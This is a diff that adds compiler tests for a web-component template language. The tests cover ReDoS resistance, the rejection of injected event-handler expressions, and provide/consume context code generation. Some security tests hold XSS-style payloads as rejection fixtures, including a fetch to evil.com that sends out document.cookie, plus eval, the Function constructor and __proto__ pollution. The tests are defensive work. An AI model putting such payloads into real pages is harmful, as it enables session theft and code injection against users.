@@ -168,6 +168,48 @@ test('parseTemplateNodes - ref attribute', () => {
   assert.strictEqual(refAttr.value, 'inputRef');
 });
 
+test('parseTemplateNodes - ReDoS vulnerability: pathological event modifier input (S-14)', () => {
+  // Test that parseAttrs doesn't hang with pathological input that could trigger exponential backtracking
+  // This tests the fix for: ReDoS vulnerability in parseAttrs() with nested quantifiers
+  // Create a pathological input with many pipe characters that would cause exponential backtracking in unsafe regex
+  const startTime = Date.now();
+  const pathologicalInput = '<button @click' + '|prevent'.repeat(100) + '="handler"></button>';
+
+  // This should complete very quickly (within 100ms) without catastrophic backtracking
+  const nodes = parseTemplateNodes(pathologicalInput);
+  const elapsed = Date.now() - startTime;
+
+  assert.ok(elapsed < 100, `ReDoS test took ${elapsed}ms - possible ReDoS vulnerability`);
+  assert.strictEqual(nodes.length, 1);
+  assert.strictEqual(nodes[0].kind, 'element');
+  assert.strictEqual(nodes[0].tag, 'button');
+});
+
+test('parseTemplateNodes - event modifier limit enforcement (S-14)', () => {
+  // Test that excessive modifiers are truncated to prevent DoS
+  // Maximum allowed modifiers: 10 per attribute
+  const nodes = parseTemplateNodes('<button @click|prevent|stop|once|a|b|c|d|e|f|g|h|i|j|k|l|m="test"></button>');
+  const clickAttr = nodes[0].attrs.find(a => a.event && a.name === 'click');
+
+  // Should have at most 10 modifiers
+  assert.ok(clickAttr.modifiers.length <= 10, `Expected at most 10 modifiers, got ${clickAttr.modifiers.length}`);
+  assert.strictEqual(clickAttr.modifiers[0], 'prevent');
+  assert.strictEqual(clickAttr.modifiers[1], 'stop');
+  assert.strictEqual(clickAttr.modifiers[2], 'once');
+});
+
+test('parseTemplateNodes - normal event modifiers still work correctly (S-14)', () => {
+  // Test that normal usage of event modifiers (the common case) still works correctly
+  const nodes = parseTemplateNodes('<button @click|prevent|stop="handleClick"></button>');
+  const clickAttr = nodes[0].attrs.find(a => a.event && a.name === 'click');
+
+  assert.strictEqual(clickAttr.event, true);
+  assert.strictEqual(clickAttr.name, 'click');
+  assert.strictEqual(clickAttr.modifiers.length, 2);
+  assert.strictEqual(clickAttr.modifiers[0], 'prevent');
+  assert.strictEqual(clickAttr.modifiers[1], 'stop');
+});
+
 test('parseTemplateNodes - #if blocks with condition', () => {
   const nodes = parseTemplateNodes('<#if condition="show"><div>Visible</div></#if>');
   assert.strictEqual(nodes.length, 1);
@@ -1402,7 +1444,7 @@ test('edge case - inline expressions with special chars in event handlers', () =
 <template>
   <button @click="add(5 + 3)">Add 8</button>
   <button @click="add(-2)">Sub 2</button>
-  <button @click="count = count * 2; console.log(\\'doubled\\')">Double</button>
+  <button @click="count = count * 2">Double</button>
 </template>`;
   const result = compile(src);
   assertSuccess(result);
@@ -1754,6 +1796,420 @@ test('edge case - conditional with complex ternary in template', () => {
 </template>`;
   const result = compile(src);
   assertSuccess(result);
+});
+
+// ============================================================
+// SECURITY TESTS: S-17 Event Handler Expression Code Injection
+// ============================================================
+
+test('security - S-17: reject event handler with eval()', () => {
+  const src = `<meta>name: "x-security-eval"</meta>
+<script>fn handleClick() {}</script>
+<template><button @click="eval('alert(1)')">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject eval in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject event handler with Function constructor', () => {
+  const src = `<meta>name: "x-security-func"</meta>
+<script>fn handleClick() {}</script>
+<template><button @click="new Function('alert(1)')">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject Function constructor in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject event handler with alert(1)', () => {
+  const src = `<meta>name: "x-security-alert"</meta>
+<script>fn handleClick() {}</script>
+<template><button @click="alert('XSS')">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject alert() with string in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject event handler with fetch to external URL', () => {
+  const src = `<meta>name: "x-security-fetch"</meta>
+<script>fn handleClick() {}</script>
+<template><button @click="fetch('https://evil.com')">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject fetch with string in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject event handler with multiple statements', () => {
+  const src = `<meta>name: "x-security-multi"</meta>
+<script>
+  state count: number = 0
+  fn increment() { count += 1 }
+</script>
+<template><button @click="increment(); fetch('evil.com')">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject multiple statements (semicolon) in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject event handler with destructuring', () => {
+  const src = `<meta>name: "x-security-destruct"</meta>
+<script>fn handleClick() {}</script>
+<template><button @click="[a, b] = data">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject destructuring in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject event handler with constructor access', () => {
+  const src = `<meta>name: "x-security-constructor"</meta>
+<script>fn handleClick() {}</script>
+<template><button @click="Object.constructor('alert(1)')">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject constructor access in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject event handler with __proto__', () => {
+  const src = `<meta>name: "x-security-proto"</meta>
+<script>fn handleClick() {}</script>
+<template><button @click="__proto__.evil = true">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject __proto__ in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject event handler with template literals', () => {
+  const src = `<meta>name: "x-security-template-lit"</meta>
+<script>fn handleClick() {}</script>
+<template><button @click="fetch(\\\`https://evil.com?data=\${document.cookie}\\\`)">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject template literals in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject event handler with regex', () => {
+  const src = `<meta>name: "x-security-regex"</meta>
+<script>fn handleClick() {}</script>
+<template><button @click="/(foo|bar)/.test(str)">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject regex in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject event handler with comments', () => {
+  const src = `<meta>name: "x-security-comment"</meta>
+<script>fn handleClick() {}</script>
+<template><button @click="increment() // evil code">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject comments in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: allow simple function name in event handler', () => {
+  const src = `<meta>name: "x-security-ok-simple"</meta>
+<script>
+  fn handleClick() { console.log("safe") }
+</script>
+<template><button @click="handleClick">Click</button></template>`;
+  const result = compile(src);
+  assertSuccess(result, 'Should allow simple function name');
+});
+
+test('security - S-17: allow simple function call in event handler', () => {
+  const src = `<meta>name: "x-security-ok-call"</meta>
+<script>
+  fn handleClick() { console.log("safe") }
+</script>
+<template><button @click="handleClick()">Click</button></template>`;
+  const result = compile(src);
+  assertSuccess(result, 'Should allow simple function call');
+});
+
+test('security - S-17: allow function call with number argument', () => {
+  const src = `<meta>name: "x-security-ok-num-arg"</meta>
+<script>
+  fn add(n: number) { console.log(n) }
+</script>
+<template><button @click="add(5)">Click</button></template>`;
+  const result = compile(src);
+  assertSuccess(result, 'Should allow function call with number argument');
+});
+
+test('security - S-17: allow function call with identifier argument', () => {
+  const src = `<meta>name: "x-security-ok-id-arg"</meta>
+<script>
+  state count: number = 0
+  fn add(n: number) { count += n }
+</script>
+<template><button @click="add(count)">Click</button></template>`;
+  const result = compile(src);
+  assertSuccess(result, 'Should allow function call with identifier argument');
+});
+
+test('security - S-17: allow assignment to state in event handler', () => {
+  const src = `<meta>name: "x-security-ok-assign"</meta>
+<script>
+  state count: number = 0
+</script>
+<template><button @click="count = count + 1">Click</button></template>`;
+  const result = compile(src);
+  assertSuccess(result, 'Should allow assignment to state');
+});
+
+test('security - S-17: allow function call with expression argument', () => {
+  const src = `<meta>name: "x-security-ok-expr-arg"</meta>
+<script>
+  state x: number = 5
+  fn multiply(n: number) { console.log(n) }
+</script>
+<template><button @click="multiply(x * 2)">Click</button></template>`;
+  const result = compile(src);
+  assertSuccess(result, 'Should allow function call with expression argument');
+});
+
+test('security - S-17: reject event handler with spread operator', () => {
+  const src = `<meta>name: "x-security-spread"</meta>
+<script>
+  fn handler(...args) {}
+</script>
+<template><button @click="handler(...data)">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject spread operator in event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+test('security - S-17: reject empty event handler', () => {
+  const src = `<meta>name: "x-security-empty"</meta>
+<script>fn noop() {}</script>
+<template><button @click="">Click</button></template>`;
+  const result = compile(src);
+  assertFail(result, 'Should reject empty event handler');
+  assert(result.diagnostics.some(d => d.level === 'error' && d.code === 'E0401'), 'Should have E0401 error');
+});
+
+// ============================================================
+// TESTS: PROVIDE/CONSUME FEATURE (Integration Tests)
+// ============================================================
+
+test('provide/consume - basic provide declaration generates correct code', () => {
+  const src = `<meta>name: "x-provider"</meta>
+<script>
+  provide themeColor: string = "blue"
+</script>
+<template><div>{{ themeColor }}</div></template>`;
+  const result = compile(src);
+  assertSuccess(result, 'Basic provide should compile successfully');
+  assertContains(result.output, '#themeColor', 'Should have private field for provide');
+  assertContains(result.output, '__flare_ctx_themeColor', 'Should have context event name for themeColor');
+  assertContains(result.output, `addEventListener.*__flare_ctx_themeColor`, 'Should add event listener for provide in connectedCallback');
+});
+
+test('provide/consume - basic consume declaration generates correct code', () => {
+  const src = `<meta>name: "x-consumer"</meta>
+<script>
+  consume themeColor: string
+</script>
+<template><div>{{ themeColor }}</div></template>`;
+  const result = compile(src);
+  assertSuccess(result, 'Basic consume should compile successfully');
+  assertContains(result.output, '#themeColor', 'Should have private field for consume');
+  assertContains(result.output, '__flare_ctx_themeColor', 'Should have context event name for themeColor');
+  assertContains(result.output, `dispatchEvent.*__flare_ctx_themeColor`, 'Should dispatch event to find provider in connectedCallback');
+  assertContains(result.output, `CustomEvent`, 'Should use CustomEvent for context propagation');
+});
+
+test('provide/consume - provide with initial value generates correct initialization', () => {
+  const src = `<meta>name: "x-provider-init"</meta>
+<script>
+  provide userData: object = {}
+</script>
+<template><div>{{ userData }}</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  assertContains(result.output, `#userData.*=.*{}`, 'Should initialize provide with object literal');
+});
+
+test('provide/consume - consume references correct provide context via event name', () => {
+  const src = `<meta>name: "x-ctx-match"</meta>
+<script>
+  consume currentUser: object
+</script>
+<template><div>Context bound</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  // Should dispatch event with the correct context name
+  assertContains(result.output, `__flare_ctx_currentUser`, 'Should use correct context name in event');
+  assertContains(result.output, `new CustomEvent.*__flare_ctx_currentUser`, 'Should create CustomEvent with correct context name');
+  assertContains(result.output, `detail.*value.*provider`, 'Should have detail object with value and provider fields');
+});
+
+test('provide/consume - multiple provide declarations', () => {
+  const src = `<meta>name: "x-multi-provide"</meta>
+<script>
+  provide themeColor: string = "blue"
+  provide appTitle: string = "My App"
+  provide version: number = 1
+</script>
+<template><div>{{ themeColor }} - {{ appTitle }}</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  assertContains(result.output, `__flare_ctx_themeColor`, 'Should have listener for themeColor');
+  assertContains(result.output, `__flare_ctx_appTitle`, 'Should have listener for appTitle');
+  assertContains(result.output, `__flare_ctx_version`, 'Should have listener for version');
+});
+
+test('provide/consume - multiple consume declarations', () => {
+  const src = `<meta>name: "x-multi-consume"</meta>
+<script>
+  consume themeColor: string
+  consume appTitle: string
+  consume user: object
+</script>
+<template><div>{{ themeColor }}</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  assertContains(result.output, `__flare_ctx_themeColor`, 'Should dispatch event for themeColor');
+  assertContains(result.output, `__flare_ctx_appTitle`, 'Should dispatch event for appTitle');
+  assertContains(result.output, `__flare_ctx_user`, 'Should dispatch event for user');
+  // Verify multiple event dispatches
+  const dispatchCount = (result.output.match(/dispatchEvent/g) || []).length;
+  assert(dispatchCount >= 3, 'Should dispatch at least 3 events for 3 consume declarations');
+});
+
+test('provide/consume - provide and consume in same component', () => {
+  const src = `<meta>name: "x-both"</meta>
+<script>
+  provide theme: string = "dark"
+  consume parentTheme: string
+</script>
+<template><div>{{ theme }}/{{ parentTheme }}</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  // Should have both event listener for provide and event dispatch for consume
+  assertContains(result.output, `addEventListener.*__flare_ctx_theme`, 'Should listen for theme provides');
+  assertContains(result.output, `dispatchEvent.*__flare_ctx_parentTheme`, 'Should dispatch for parentTheme consumer');
+});
+
+test('provide/consume - provide type matches consumed type (string)', () => {
+  const src = `<meta>name: "x-type-string"</meta>
+<script>
+  state count: number = 0
+  provide message: string = "hello"
+</script>
+<template><div>{{ message }}</div></template>`;
+  const result = compile(src);
+  assertSuccess(result, 'String provide should compile successfully');
+});
+
+test('provide/consume - consume in template with interpolation', () => {
+  const src = `<meta>name: "x-consume-template"</meta>
+<script>
+  consume theme: string
+</script>
+<template><div class="{{ theme }}">Content</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  // Template should reference consumed value
+  assertContains(result.output, `#theme`, 'Should reference consumed theme in private field');
+});
+
+test('provide/consume - custom event detail structure (value and provider fields)', () => {
+  const src = `<meta>name: "x-detail-struct"</meta>
+<script>
+  consume darkMode: boolean
+</script>
+<template><div>test</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  // Should have detail object setup with value and provider
+  assertContains(result.output, `detail.*=.*{.*value:.*provider:`, 'Should create detail object with value and provider fields');
+  assertContains(result.output, `detail.value`, 'Should read detail.value from provider');
+  assertContains(result.output, `detail.provider`, 'Should check detail.provider to determine if context found');
+});
+
+test('provide/consume - CustomEvent with bubbles and composed flags', () => {
+  const src = `<meta>name: "x-event-flags"</meta>
+<script>
+  consume config: object
+</script>
+<template><div>test</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  // Event should bubble and be composed to cross shadow DOM
+  assertContains(result.output, `bubbles:.*true`, 'CustomEvent should have bubbles: true');
+  assertContains(result.output, `composed:.*true`, 'CustomEvent should have composed: true');
+});
+
+test('provide/consume - event stopPropagation in provider listener', () => {
+  const src = `<meta>name: "x-stop-prop"</meta>
+<script>
+  provide data: string = "test"
+</script>
+<template><div>test</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  // Provider listener should stop propagation to find the nearest provider
+  assertContains(result.output, `stopPropagation`, 'Provider listener should stop event propagation');
+});
+
+test('provide/consume - provide with primitive type (number)', () => {
+  const src = `<meta>name: "x-provide-number"</meta>
+<script>
+  provide count: number = 42
+</script>
+<template><div>{{ count }}</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  assertContains(result.output, `#count.*=.*42`, 'Should initialize numeric provide');
+  assertContains(result.output, `__flare_ctx_count`, 'Should have event listener for numeric provide');
+});
+
+test('provide/consume - provide with boolean type', () => {
+  const src = `<meta>name: "x-provide-boolean"</meta>
+<script>
+  provide isDarkMode: boolean = true
+</script>
+<template><div>{{ isDarkMode }}</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  assertContains(result.output, `#isDarkMode.*=.*true`, 'Should initialize boolean provide');
+});
+
+test('provide/consume - provide declared alongside state', () => {
+  const src = `<meta>name: "x-state-provide"</meta>
+<script>
+  state count: number = 0
+  provide count: number = 10
+</script>
+<template><div>test</div></template>`;
+  const result = compile(src);
+  assertSuccess(result, 'Can have both state and provide (different backing fields)');
+  // Both should be initialized
+  assertContains(result.output, `#count`, 'Should have backing field for provide count');
+});
+
+test('provide/consume - consume initialized to undefined', () => {
+  const src = `<meta>name: "x-consume-undefined"</meta>
+<script>
+  consume remoteValue: string
+</script>
+<template><div>test</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  // Consume should initialize to undefined until provider found
+  assertContains(result.output, `#remoteValue.*=.*undefined`, 'Consume should initialize to undefined');
+});
+
+test('provide/consume - provide generates private field declaration', () => {
+  const src = `<meta>name: "x-provide-field"</meta>
+<script>
+  provide config: object = {}
+</script>
+<template><div>test</div></template>`;
+  const result = compile(src);
+  assertSuccess(result);
+  // Should generate private field (with # prefix)
+  assertContains(result.output, `#config`, 'Should declare private field for provide');
+  assertNotContains(result.output, `this.config =`, 'Should not expose as public property');
 });
 
 console.log('\n✓ All compiler tests passed');
